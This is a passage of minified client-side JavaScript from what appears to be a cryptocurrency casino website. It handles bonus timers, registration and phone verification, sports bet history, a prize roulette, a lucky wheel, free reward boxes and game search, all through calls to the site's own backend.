    document.getElementsByClassName("modal_extraReg")[0].classList.remove("active"), errUnFixCoins()
}, fbon0 = 0, openFirstBon = (e, t) => {
    e = Number(e);
    let a = 1e3 * ((t = Number(t)) - e),
        n = 6e5;
    if (a <= n) {
        fbon0 = 1, document.getElementsByClassName("fbon_wr")[0].classList.add("active");
        let e = 0,
            r = a => {
                e += 1e3;
                let n = a - (t + e);
                n > 0 ? (n /= 1e3, day = "0" + Math.floor(n / 86400), h = "0" + Math.floor((n - 86400 * day) / 3600), m = "0" + Math.floor((n - 86400 * day - 3600 * h) / 60), s = "0" + Math.floor(n - 86400 * day - 3600 * h - 60 * m)) : (fbon0 = 0, closeFirstBon(), day = h = m = s = "00", clearInterval(bonSet)), document.getElementById("fbon_min").innerHTML = m.substr(-2), document.getElementById("fbon_sec").innerHTML = s.substr(-2)
            },
            o = t + (n - a);
        r(o), bonSet = setInterval((() => {
            r(o)
        }), 1e3), 0 == activateEmail && null == getCookieChat("aEmail58") && (gD("cok_pop55").style.display = "flex")
    }
}, closeFirstBon = (e = !1, t = 1) => {
    2 == t && asyFunc(openDeposite, openDepSLot, "deposit"), e || clearInterval(bonSet), e && e.stopPropagation();
    let s = document.getElementsByClassName("fbon_wr")[0];
    s && (s.classList.contains("small_active") ? s.style.display = "none!important" : s.classList.add("small_active"), e || s.classList.remove("active"))
}, saveExtraReg = e => {
    let t = new FormData,
        s = "",
        a = gD("last_nameUserE").value,
        n = gD("first_nameUserE").value,
        r = gD("e_phoneE").value,
        o = gD("phonecodeExt").value;
    da = gD("dayUserE").value, mon = gD("monthUserE").value, yea = gD("yearUserE").value, t.set("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone), t.set("action", "saveUserInfoFP"), t.set("fname", n), t.set("lname", a), t.set("phonecode", o), t.set("phone", r);
    let i = ["last_nameUserE", "dayUserE", "e_phoneE", "phonecodeExt", "monthUserE", "yearUserE", "first_nameUserE"];
    i = i.map((e => gD(e))), i.forEach((e => e.parentNode.classList.remove("err756")));
    let l = 0;
    if (i.forEach((e => {
            "" == e.value && (createNotifyL(1, lp["Not all fields"], lp.Error), e.parentNode.classList.add("err756"), l = 1)
        })), 1 == l) return;
    s = yea + "-" + mon + "-" + da, t.set("birthday", s), s = s.replace(/-/g, "/");
    let c = (new Date).getTime() - new Date(s).getTime() - 567648e6;
    if (i = ["dayUserE", "monthUserE", "yearUserE"], "NaN" == String(c) || c < 0) return i = i.map((e => gD(e))), i.forEach((e => e.parentNode.classList.add("err756"))), void createNotifyL(1, "Date wrong", lp.Error);
    da = "0" + da, mon = "0" + mon;
    let d = da.substr(-2) + "." + mon.substr(-2) + "." + yea,
        u = gD("coins_preloadOpen");
    u && (u.style.display = "flex"), e.disabled = !0, axios({
        method: "post",
        url: "/user/func.php",
        data: t,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((async t => {
        u && (u.style.display = ""), e.disabled = !1, 0 == t.data.error ? (createNotifyL(2, "", lp.Success), objUserInfo.fname = n, objUserInfo.lname = a, gD("phonecode23").value = o, gD("name_tel10").value = r, gD("first_nameUser").disabled = !0, gD("first_nameUser").value = n, gD("last_nameUser").disabled = !0, gD("last_nameUser").value = a, gD("dateUser").type = "text", gD("dateUser").disabled = !0, gD("dateUser").value = d.replace("-", "."), closeExtraRe(), deleteCookie("entry99"), await asyFunc(openDeposite, openDepSLot, "deposit"), lngGame != document.getElementsByClassName("lng_main_img")[0].getAttribute("alt") && location.reload()) : createNotifyL(1, t.data.message, lp.Error)
    })).catch((function(t) {
        u && (u.style.display = ""), e.disabled = !1, createNotifyL(1, t.message, lp.Error)
    }))
}, openSportBets = async () => {
    if (1 != window.user_il) return void openMobileLogin();
    await modalOpenNew("modal_sportbets", "sportBets"), document.getElementsByClassName("modal_sportbets")[0].classList.add("active"), await getSportBets(), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&sportbets", 1)
}, closeSportBets = () => {
    document.getElementsByClassName("modal_sportbets")[0].classList.remove("active"), errUnFixCoins(), closeHistory("&sportbets")
}, closeUnlRules = () => {
    document.getElementsByClassName("modal_unlRules")[0].classList.remove("active"), errUnFixCoins()
}, openUnlRules = async (e = 1) => {
    await modalOpenNew("modal_unlRules", "partnerVip");
    let t = document.getElementsByClassName("modal_unlRules")[0];
    t.classList.add("active");
    let s = document.getElementsByClassName("lwlist87")[0];
    if (2 == e) {
        t.classList.add("latwins");
        let e = new FormData;
        e.set("action", "getEndTournamentUserList"), e.set("id", globalTours);
        let a = await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        if (a = a.data, !a.error) {
            s.innerHTML = "";
            let e = "",
                t = "",
                n = "";
            Object.entries(a).forEach((s => {
                let a = "gr57",
                    r = Number(s[0]);
                r < 11 && (a = "re57"), r > 10 && r < 51 && (a = "ye57"), r > 50 && r < 101 && (a = "bl57"), n = `/assets/coins/${s[1].currency}.svg`, t = Number(s[1].win).toFixed(2), "fs" == globalTours && (n = "/assets/image/tournaments/tur0.png", t += " FS"), e += `<div class="table_inlTD">\n      <div><div class="tunl_ci ${a}"></div>\n      <div class="tunl_text">${s[0]}</div>\n      </div><div>${s[1].user}</div>\n      <div><img src="${n}" alt="Cur">\n      <div class="tunl_amount">+ ${t}</div></div></div>`
            })), s.innerHTML = e
        }
    } else t.classList.remove("latwins"), s.innerHTML = "";
    errFixCoins()
}, closeGetPrize = () => {
    document.getElementsByClassName("modal_getPrize")[0].classList.remove("active"), document.getElementsByClassName("lwlist87")[0].innerHTML = "", errUnFixCoins(), closeHistory("&getPrize")
}, backRoulB = e => {
    let t = document.getElementsByClassName("getPrize_r2")[0],
        s = document.getElementsByClassName("getPrize_r1")[0];
    1 == e ? (t.style.display = "none", s.style.display = "block") : (s.style.display = "none", t.style.display = "block")
}, cArr554 = [], openGetRoul = async () => {
    let e;
    backRoulB(1);
    let t = new FormData;
    t.set("action", "getCouponRoulette");
    let s = await axios({
        method: "post",
        url: "/user/func.php",
        data: t,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    if (s = s.data, !s.error) {
        countEls55 = s.data.length;
        let t = 3;
        countEls55 < 100 && (t = Math.round(100 / countEls55) + 1, t += countEls55 < 5 ? Math.round(5 / countEls55) : 1, countEls55 = countEls55 * Math.round(100 / countEls55) - countEls55);
        let a = e => `<div class="get_pr_ite">\n      <img src="${""!=e.imgURL?e.imgURL:`/assets/image/roulette/${e.img}.jpeg`}" alt="Item name">\n      <p>${e.id}</p>\n      </div>`,
            n = "",
            r = "";
        cArr554 = s.data;
        for (let e = 0; e < t; e++) s.data.forEach((t => {
            n += a(t), 0 == e && (r = n)
        }));
        e = document.getElementsByClassName("g_p_c777")[0], e.innerHTML = n, e = document.getElementsByClassName("g_p_c444")[0], e.innerHTML = r
    }
}, openGetPrize = async () => {
    await modalOpenNew("modal_getPrize", "getPrize"), document.getElementsByClassName("modal_getPrize")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&getPrize", 1)
}, getPrizeR = async () => {
    let e = new FormData;
    e.set("action", "getCouponRouletteWin");
    let t = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    if (t = t.data, !t.error) {
        spentTimeI = 10;
        let e = document.getElementsByClassName("get_pr_line")[0],
            s = e.getElementsByClassName("get_pr_cont")[0];
        s.style.transition = "all 0s cubic-bezier(0, 0, 0.25, 1)", s.style.transform = "translate3d(0px, 0px, 0px)";
        let a = s.getElementsByClassName("get_pr_ite")[0],
            n = a.offsetWidth / 2,
            r = a.offsetWidth,
            o = cArr554.findIndex((e => e.id == t.win));
        o = o + 1 + countEls55, dg = r * o - r + n + 10 * (o - 1) - e.offsetWidth / 2, ourDeg = -Number(dg) + n / 2, finDeg = -Number(dg), s.style.transition = `all ${spentTimeI}s cubic-bezier(0, 0, 0.25, 1)`, s.style.transform = `translate3d(${ourDeg}px, 0px, 0px)`, setTimeout((() => {
            s.style.transition = "all 0.2s cubic-bezier(0, 0, 1, 1)", s.style.transform = `translate3d(${finDeg}px, 0px, 0px)`
        }), 1e3 * spentTimeI)
    }
}, closeProfile = () => {
    document.getElementsByClassName("modal_profile")[0].classList.remove("active"), errUnFixCoins(), closeHistory("&profile")
}, closeStatic = () => {
    document.getElementsByClassName("modal_static")[0].classList.remove("active"), errUnFixCoins(), closeHistory("&statistics")
}, openBonus = async (e = 1, t = 1) => {
    if (await modalOpenNew("modal_bonus", "bonusJet"), document.getElementsByClassName("modal_bonus")[0].classList.add("active"), errFixCoins(), 1 == window.user_il || 1 != e)
        if (getJETInfo(), 1 == e) openHistory("?" + window.location.href.split("?")[1] + "&bonusJet", 1);
        else {
            e.preventDefault(), e.stopPropagation();
            let s = t.parentNode.dataset.cur;
            chaBonus(s)
        }
    else chaBonus("JET")
}, changeHB = (e, t) => {
    let s = document.getElementsByClassName("tab_modal_hb");
    Array.from(s).forEach((e => e.classList.remove("active"))), t.classList.add("active"), 1 == e ? (stSportsBets = 1, getSportBets()) : (stSportsBets = 0, getSportBets())
}, stFiat = 0, curCCH = (e, t, s = !1) => {
    if (stFiat != e || s) {
        let s = document.getElementsByClassName("t_m_c113");
        Array.from(s).forEach((e => e.classList.remove("active"))), t.classList.add("active"), stFiat = e, fillBalHead(1 != e ? arrayCurrency : arrayCurrencyFiat);
        let a = document.getElementsByClassName("balance_cur_" + userBetCur)[0];
        a && chaBal({
            currentTarget: a
        }, 2), 1 == stBal0 && (getCurs0(2), getCurs0(1)), 1 == stBalUsd && (getUSD(2), getUSD(1))
    }
}, stFCRbl = "", changeDW = (e, t) => {
    let s = document.getElementsByClassName("dw_fiat" + t)[0],
        a = document.getElementsByClassName("dw_crypto" + t)[0];
    if (3 == e) return a.style.display = "none", void(s.style.display = "none");
    1 == e ? (a.style.display = "none", s.style.display = "block") : (a.style.display = "block", s.style.display = "none"), stFCRbl = e
}, stSportsBets = 0, getSportBets = () => {
    let e = new FormData;
    e.set("action", "getSportBetHistory"), axios.post("/user/func.php", e).then((e => {
        let t = document.getElementsByClassName("sport_cards")[0],
            s = "";
        t.innerHTML = "", e = e.data, (e = stSportsBets ? e.filter((e => "undefined" != e.coupon_result)) : e.filter((e => "undefined" == e.coupon_result))).length > 0 ? (t.style.display = "block", document.getElementsByClassName("sport_hidden")[0].style.display = "none") : (t.style.display = "none", document.getElementsByClassName("sport_hidden")[0].style.display = "flex"), e.forEach((e => {
            let t = lp.win;
            "lose" == e.coupon_result && (t = lp.lose), "return" == e.coupon_result && (t = "return");
            let a = getTimeDots(e.bet_time),
                n = JSON.parse(e.data),
                r = "";
            n.forEach((e => {
                let t = `<div class="card1_bet card1_score">${e.bet_score}</div>`;
                null == e.bet_score && (t = "");
                let s = getTimeDots(e.start_time);
                r += `\n            <div class="card1_wrb">\n                  <div  class="card1_name_tour">\n                  <div  class="card1_n1">\n                  <span class="card1_tk">Date</span>\n                  <span class="card1_tg">${s}</span>\n                  </div>\n                  <div  class="card1_n1">\n                  <span class="card1_tk">Game</span>\n                  <span class="card1_tg">${e.sport}.${e.tournament}</span>\n                  </div>\n                  </div>\n                  <div class="card1_name"><div class="card1_dot ${e.bet_result}117"></div>${e.players}</div>\n                  <div class="card1_market">${e.market}</div>\n                  <div class="card1_bet">${e.bet}\n                  <div class="card1_kef">${e.coef}</div>\n                  </div>\n                  ${t}\n            </div>\n            `
            }));
            let o = lp["total coefficient"],
                i = e.coef_full;
            3 == e.coupon_type && (o = "Bet type system", i = e.bet_type_system);
            let l = stSportsBets ? `<div class="card1_t ${e.coupon_result}117">${t}</div>` : "";
            s += `\n          <div class="sport_card1">\n              <div class="card1_h">\n                  ${l}\n                  <div class="card1_time">${a}</div>\n              </div>\n              <div class="card1_info">\n                  ${r}\n              </div>\n              <div class="card1_logo">\n                  <div>coins.game</div>\n              </div>\n              <div class="card1_d">\n              <div class="card1_allkef">\n                  ${o}\n                  <span>\n                  ${i}\n                  </span>\n              </div>\n              <div class="card1_allbet">\n                  ${lp["total bet"]}\n                  <span>\n                  ${e.bet_amount_currency}\n                  <img loading="lazy" src="/assets/coins/${e.bet_currency}.svg" alt="currency">\n                  </span>\n              </div>\n              <div class="card1_allpay">\n                 ${lp.payout}\n                  <span>\n                  ${e.win_amount_currency}\n                  <img loading="lazy" src="/assets/coins/${e.bet_currency}.svg" alt="currency">\n                  </span>\n              </div>\n              </div>\n          </div>\n          `
        })), t.innerHTML = s
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, getTimeDots = e => {
    let t = new Date(1e3 * e),
        s = t.getDate() < 10 ? "0" + t.getDate() : t.getDate(),
        a = t.getHours() < 10 ? "0" + t.getHours() : t.getHours(),
        n = t.getMinutes() < 10 ? "0" + t.getMinutes() : t.getMinutes();
    return `${s}.${Number(t.getMonth())+1<10?"0"+(Number(t.getMonth())+1):Number(t.getMonth())+1}.${t.getFullYear()} (${a}:${n})`
}, getJETInfo = (e = "") => {
    let t = new FormData;
    t.set("action", "getUserBonusData"), axios.post("/user/func.php", t).then((t => {
        let s = t.data.unblockAmount,
            a = t.data.blockAmount;
        setjetinfo(s, a, e)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, createCurVal = (e, t) => {
    let s, a = userBetCur,
        n = 2;
    return "JET" != userBetCur && "CANDY" != userBetCur || (a = arrCountryF[userCountry] ? arrCountryF[userCountry] : "USD"), 2 == t ? a : (s = Number(e) * Number(listCurs.data.rates[a]), n = cryptoSetPrc2[a] ? cryptoSetPrc2[a] : 2, s = window.truncatorJet(s, n, n), cryptoSetPrc2[a] || (s = Number(s).toLocaleString(`${lngGame}-${lngGame.toUpperCase()}`)), s)
}, setjetinfo = (e, t, s = "") => {
    let a = gD("b_ul_t2" + s);
    a && (a.innerHTML = window.truncatorJet(Number(e), 2, 2)), a = gD("b_a_t1" + s), a && (a.innerHTML = window.truncatorJet(Number(e), 2, 2), Number(e) < .01 ? a.parentNode.disabled = !0 : a.parentNode.disabled = !1), a = gD("b_bl_t1" + s), a && (a.innerHTML = window.truncatorJet(Number(t), 6, 6)), a = gD("b_ul_t1" + s), a && (a.innerHTML = window.truncatorJet(Number(t), 2, 2)), a = gD("b_bl_t2" + s);
    let n = createCurVal(t),
        r = createCurVal(0, 2);
    a && (a.innerHTML = n + " " + r), n = createCurVal(400), a = gD("wagOne12"), a && (a.innerHTML = n + " " + r);
    let o = Number(e) / (Number(e) + Number(t)) * 100;
    isNaN(o) && (o = 0);
    let i = o;
    o >= 100 ? o = 100 : o += 1, i > 100 && (i = 100), o = o.toFixed(2), i = i.toFixed(2), a = gD("b_st_l0" + s), a && (a.style.width = o + "%"), a = gD("b_st_t0" + s), a && (a.innerHTML = i + "%"), a = gD("b_ci" + s), a && (a.style.strokeDasharray = `${32*Math.PI}, ${32*Math.PI}`), a && (a.style.strokeDashoffset = (100 - Number(o)) / 100 * (32 * Math.PI))
}, checkFGs = e => 0 == favGs.filter((function(t) {
    return t.indexOf(e) > -1
})).length, chGames = (e, t) => {
    let s = checkFGs(e);
    if (s) favGs.push(e);
    else {
        let t = favGs.findIndex((t => t == e));
        favGs.splice(t, 1)
    }
    s ? t.currentTarget.classList.add("active") : t.currentTarget.classList.remove("active"), localStorage.setItem("favGs" + userIDGame, JSON.stringify(favGs))
}, RecGs = [], favGs = [], checkRGs = e => 0 == RecGs.filter((function(t) {
    return t.indexOf(e) > -1
})).length, chRGames = e => {
    let t = RecGs.findIndex((t => t == e)); - 1 == t ? (RecGs.length > 99 && RecGs.pop(), RecGs.unshift(e)) : (RecGs.splice(t, 1), RecGs.unshift(e)), localStorage.setItem("RecGs" + userIDGame, JSON.stringify(RecGs))
}, search = "", searchGame = e => {
    search = e;
    let t = [],
        s = document.getElementsByClassName("cross-search965")[0];
    if (search.length > 2) {
        s && (s.style.display = "block");
        let e = new RegExp(search, "i");
        casinoGames.forEach((s => {
            (e.test(s[1].n) || e.test(s[1].p)) && t.push(s)
        })), document.getElementById("count_serch2").innerHTML = t.length, addSearchGames(t, "")
    }
}, getSlots = async () => {
    casinoGames = await axios.get("/search/games.json?x=" + cash_), window.casinoGames = casinoGames, casinoGames = Object.entries(casinoGames.data.slots_data.items);
    let e = [],
        t = [];
    uProvCoins = await axios.get("/game_play/cache/all_providers.json?x=" + cash_), uProvCoins = uProvCoins.data;
    let s = await axios.get("/game_play/cache/all_providers_block.json?x=" + cash_);
    s = s.data, t = null != s[`${userCountry}`] ? s[`${userCountry}`] : [], s.all.forEach((e => t.push(e))), t.length > 0 && (uProvCoins = uProvCoins.filter((e => -1 == t.findIndex((t => t.n == e.n && t.i == e.d.i)))), casinoGames = casinoGames.filter((e => -1 == t.findIndex((t => t.n == e[1].p && t.i == e[1].i)))));
    let a = [],
        n = [],
        r = Array.from(uProvCoins.filter((e => 0 == e.d.i)));
    a = uProvCoins.filter((e => 3 == e.d.i)), r.forEach((e => {
        let t = -1;
        a.forEach((s => {
            e.n == s.n && (t = 2)
        })), -1 == t ? a.push(e) : n.push(e)
    })), r = Array.from(uProvCoins.filter((e => 3 != e.d.i && 0 != e.d.i))), r.forEach((e => {
        let t = -1;
        a.forEach((s => {
            e.n == s.n && (t = 2)
        })), -1 == t ? a.push(e) : n.push(e)
    })), uProvCoins = a, casinoGames = casinoGames.filter((e => -1 == n.findIndex((t => t.n == e[1].p && t.d.i == e[1].i)))), uProvCoins.forEach((t => {
        e.push(t.n)
    })), e = e.sort()
}, tookBonusJet = (e = "") => {
    let t = new FormData;
    t.set("action", "goUnblockBonusToJet"), axios.post("/user/func.php", t).then((t => {
        0 == t.data.error ? (1 != e && (e = ""), getJETInfo(e)) : createNotifyL(1, t.data.message, lp.Error)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, closeBonus = () => {
    let e = document.getElementsByClassName("modal_bonus")[0];
    e && (e.classList.remove("active"), e.classList.remove("jet_234"), e.classList.remove("candy_234"), e.classList.remove("jet_222")), errUnFixCoins(), closeHistory("&bonusJet")
}, closeVerRep = () => {
    document.getElementsByClassName("modal_verrep")[0].classList.remove("active"), errUnFixCoins(), closeHistory("&verify_representative")
}, openVerRep = async () => {
    await modalOpenNew("modal_verrep", "verrep"), document.getElementsByClassName("modal_verrep")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&verify_representative", 1)
}, openSettings = async () => {
    if (1 != window.user_il) return void openMobileLogin();
    if (await modalOpenNew("modal_settings", "settings"), 1 == sendMailPromo) {
        let e = document.getElementsByClassName("email_acitve117")[0];
        e && e.classList.add("acitve")
    }
    if (1 == hideNick) {
        let e = document.getElementsByClassName("hide_acitve23")[0];
        e && e.classList.add("acitve")
    }
    if (0 == activateEmail) {
        document.getElementsByClassName("email_notif117")[0].style.display = "none"
    }
    if (1 == activateEmail) {
        document.getElementsByClassName("email_ver17")[0].style.display = "none"
    }
    if (1 == phoneVerif && (gD("setVerPh34").classList.remove("setPhonVer"), gD("phonecode23").disabled = !0, gD("name_tel10").disabled = !0), "" == objUserInfo.phonecode) {
        let e = countryPhoneCodes[userCountry];
        e && (gD("phonecode23").value = e)
    }
    document.getElementsByClassName("modal_settings")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&settings", 1)
}, closeSettings = () => {
    document.getElementsByClassName("modal_settings")[0].classList.remove("active"), errUnFixCoins(), -1 != window.location.href.indexOf("=Security") ? closeHistory("&settings=Security") : closeHistory("&settings")
}, openPhone = async () => {
    await modalOpenNew("modal_phone", "phone"), document.getElementsByClassName("modal_phone")[0].classList.add("active"), errFixCoins()
}, closePhone = () => {
    document.getElementsByClassName("modal_phone")[0].classList.remove("active")
}, finishPhone = async () => {
    if (0 == gD("name_tel10").value.length) return void createNotifyL(1, "Phone!", lp.Error);
    let e = new FormData;
    e.set("action", "saveUserInfo2"), e.set("phonecode", gD("phonecode23").value), e.set("phone", gD("name_tel10").value);
    let t = await axios({
        method: "post",
        url: "/user/func.php",
        data: e,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }));
    0 == t.data.error ? axios({
        method: "post",
        url: "/user/func.php",
        data: "action=sendVerifyCode",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    }).then((async function(e) {
        parseInt(e.data.id[0], 10) ? createNotifyL(1, e.data.m, lp.Error) : openPhone()
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    })) : createNotifyL(1, t.data.message, lp.Error)
}, sendCodeReg = () => {
    let e = document.getElementById("registr-sms-val92").value,
        t = new FormData;
    t.set("action", "checkVerifyCode"), t.set("code", e), axios.post("/user/func.php", t).then((e => {
        parseInt(e.data.id[0], 10) ? createNotifyL(1, e.data.m, lp.Error) : (createNotifyL(2, "", lp.Success), phoneVerif = 1, gD("setVerPh34").classList.remove("setPhonVer"), gD("phonecode23").disabled = !0, gD("name_tel10").disabled = !0, closePhone())
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, openWheel = async () => {
    await modalOpenNew("modal_wheel", "luckyWheel");
    let e = document.getElementsByClassName("modal_wheel")[0];
    await getWheelNumbers(), e.classList.add("active"), setOffUser(), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&bonusWheel", 1)
}, getWheelNumbers = async () => {
    let e = new FormData;
    e.set("action", "FreeWheelNumbers");
    let t = await axios.post("/user/func.php", e).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        })),
        a = t.data;
    t = t.data.data;
    let n = document.getElementById("wheel_circle1");
    n = n.getElementsByClassName("spin-item"), Array.from(n).forEach(((e, s) => {
        let a = t[s + 1],
            n = window.truncatorJet(a.amount, 4, 4);
        1 == a.block && (n = '<span style="color:black">🔒</span>' + window.truncatorJet(a.amount, 2, 2));
        let r = e.getElementsByClassName("amount")[0];
        "BTC" == a.currency && (r.classList.add("BTC56"), n = Number(n).toFixed(2)), r.innerHTML = n, e.getElementsByClassName("coin-icon")[0].setAttribute("src", `/assets/coins/${a.currency}.svg`)
    })), gD("w_w_all1").innerHTML = "$" + a.all, gD("w_w_a1").innerHTML = a.winners[0].a + " " + a.winners[0].c, gD("w_w_n1").innerHTML = a.winners[0].n ? a.winners[0].n : "Hidden", gD("w_w_n1").innerHTML += " ";
    let r = `/assets/chat/img/avatar${a.aid}.svg?x=10`;
    0 == a.aid && (r = `/user_thumb/a_${a.aurl}.jpg?x=${Date.now()}`), gD("w_w_s1").onerror = e => {
        e.currentTarget.setAttribute("src", "/assets/chat/img/avatar1.svg?x=10")
    }, gD("w_w_s1").setAttribute("src", r), gC("wheelL_bets1")[1].innerHTML = "";
    let o = "";
    a.winners.forEach((e => {
        o += `\n    <div class="tr">\n    <div class="td">\n    ${e.n?e.n:"Hidden"}\n    </div>\n    <div class="td">\n    Lucky Wheel\n    </div>\n    <div class="td">\n    <div class="fd117">+${e.a}  \n      <img loading="lazy" class="coin-icon" src="/assets/coins/${e.c}.svg">\n    </div>\n    </div></div>\n    `
    })), gC("wheelL_bets1")[1].innerHTML = o;
    let i = 0,
        l = e => {
            let t = e,
                n = a.stime;
            i += 1;
            let r = t - (n + i),
                o = gD("lwb253");
            r > 0 ? (h = "0" + Math.floor(r / 3600), m = "0" + Math.floor((r - 3600 * h) / 60), s = "0" + Math.floor(r - 3600 * h - 60 * m), o.disabled = !0, o.innerHTML = `Next spin <br> ${h.substr(-2)} : ${m.substr(-2)} : ${s.substr(-2)}`) : (h = m = s = "00", clearInterval(wheelTis), o.disabled = !1, o.innerHTML = "Spin Wheel")
        };
    l(a.start + a.stime), wheelTis = setInterval((() => {
        l(a.start + a.stime)
    }), 1e3)
}, closeWheel = () => {
    let e = document.getElementsByClassName("modal_wheel")[0];
    e.classList.remove("active"), e.classList.remove("jetWin908"), btn = gD("wheelBonus_main"), btn.style = "", btn = gD("wheelBonus_win"), btn.style.display = "none", 1 == stJetInfo222 && (stJetInfo222 = 0), wheelTis && clearInterval(wheelTis), errUnFixCoins(), closeHistory("&bonusWheel")
}, openHelp = async () => {
    await modalOpenNew("modal_help", "help"), document.getElementsByClassName("modal_help")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&help-center", 1)
}, closeHelp = () => {
    document.getElementsByClassName("modal_help")[0].classList.remove("active"), errUnFixCoins(), closeHistory("&help-center")
}, openPayment = async () => {
    await modalOpenNew("modal_payment", "payment"), document.getElementsByClassName("modal_payment")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&payment", 1)
}, closePayment = () => {
    document.getElementsByClassName("modal_payment")[0].classList.remove("active"), errUnFixCoins(), closeHistory("&payment")
}, openRoules = async () => {
    await modalOpenNew("modal_roules", "roules"), document.getElementsByClassName("modal_roules")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&rules", 1)
}, closeRoules = () => {
    document.getElementsByClassName("modal_roules")[0].classList.remove("active"), errUnFixCoins(), -1 != window.location.href.indexOf("=PrivacyPolicy") ? closeHistory("&rules=PrivacyPolicy") : closeHistory("&rules"), -1 != window.location.href.indexOf("=TermsOfService") ? closeHistory("&rules=TermsOfService") : closeHistory("&rules")
};

function createTelegScr(e) {
    let t, s = document.createElement("script"),
        a = document.getElementById("telegram-login-CoinsGameLogin_bot");
    a ? s = a : (s.async = !0, s.src = "https://telegram.org/js/telegram-widget.js?15", s.setAttribute("data-telegram-login", "CoinsGameLogin_bot"), s.setAttribute("data-size", "large"), s.setAttribute("data-auth-url", "https://coins.game/oauth/telegram.php"), s.setAttribute("data-request-access", "write")), t = document.getElementById("telegram_button_reg" + e), t && t.appendChild(s), 1 == e && (t = document.getElementById("telegram_button_reg3"), t && t.appendChild(s))
}
window.openPartner = async () => {
    if ("Partner" != pageNameM) {
        if (pageNameM = "Partner", setTitlePage(pageNameM), await openPageSite("partner", "partner"), "0" != user_in) {
            let e = new FormData;
            e.set("action", "getAffilData"), axios.post("/user/func.php", e).then((e => {
                (e = e.data).affilAllWithdraw && (document.getElementById("affil_with12").innerHTML = e.affilAllWithdraw, document.getElementById("affil_avai12").innerHTML = e.affilAvailable, document.getElementById("affil_refs12").innerHTML = e.refCount, document.getElementById("affil_link12").value = e.refLink)
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        }
        openHistory("?partner", 2)
    }
};
let boxTimeIn, freeBoxData, secundBox = 0;
window.openBox = async (e = !1) => {
    ("Box" != pageNameM || e) && (pageNameM = "Box", setTitlePage(pageNameM), await openPageSite("freebox", "freebox"), "0" != user_in && await getInfoUserBoxes(), openHistory("?freebox", 2), "0" != user_in && (boxTimeIn = setInterval((() => {
        secundBox += 1, getBoxesData(freeBoxData)
    }), 1e3)))
};
let getInfoUserBoxes = async () => {
    let e = new FormData;
    e.set("action", "getInfoUserBoxes"), await axios.post("/user/func.php", e).then((e => {
        e = e.data, secundBox = 0, freeBoxData = e, getBoxesData(freeBoxData)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}, getBoxesData = e => {
    e.boxes = Object.values(e.boxes), e.boxes.forEach(((t, s) => {
        document.getElementsByClassName("free-box__" + t.currency)[0].style.display = "block";
        let a = document.getElementById("box_fin" + s);
        a.innerHTML = t.upto;
        let n = 0;
        n = (Number(e.ctime) + secundBox - Number(e.startTime)) * t.persecond + Number(e[`amount_${s+1}`]), n > t.upto && (n = t.upto, document.getElementById("box_btn" + s).disabled = !1), n = window.truncatorJet(n, betListCur[t.currency].precision), a = document.getElementById("box_daily" + s), a.innerHTML = "JET" == t.currency ? (86400 * t.persecond).toFixed(2) : 86400 * t.persecond, a = document.getElementById("box_with" + s), a.innerHTML = n, a = document.getElementById("box_now" + s), a.innerHTML = n, a = document.getElementById("box_pro" + s), a.innerHTML = n / t.upto * 100, a.value = n / t.upto * 100
    }))
}, getBonusBox = (e, t) => {
    if ("0" != user_in) {
        let s = new FormData;
        s.set("action", "userClickGetBox");
        let a = Number(t) + 1;
        s.set("boxID", a), axios.post("/user/func.php", s).then((t => {
            0 == t.data.error ? (e.setAttribute("disabled", !0), getInfoUserBoxes()) : createNotifyL(1, t.data.message, lp.Error)
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    } else createNotifyL(1, "", lp.Error)
}, updateGame77 = (e, t, s) => {
    let a = document.getElementsByClassName(e + "_fast2")[0];
    a && (a.classList.remove("open123"), setTimeout((() => {
        let e = a.getElementsByClassName("fast2_am")[0];
        t = Number(t) / Number(listCurs.data.rates[s]), isNaN(t) && (t = 0), t = t.toFixed(2), e.innerHTML = t + " $", a.classList.add("open123")
    }), 50))
}, searchCoins = (e, t = 0) => {
    let s = document.getElementsByClassName("r_w54")[0],
        a = document.getElementsByClassName("r_w45")[0];
    e.length >= 3 ? (s.style.display = "block", a.style.display = "none") : (a.style.display = "block", s.style.display = "none"), 0 == t && setSearCat(1), 0 == t ? searchGame(e) : addSearchGames(t, "")
}, clearSearch = () => {
    document.getElementsByClassName("history-list-wrap")[0].innerHTML = "";
    localStorage.setItem("historySearch", JSON.stringify([]))
}, saveSearch = (e, t = 0) => {
    if (e.length >= 3) {
        let s = JSON.parse(localStorage.getItem("historySearch")),
            a = document.getElementsByClassName("history-list-wrap")[0],
            n = e => {
                let t = e.replaceAll(" ", "");
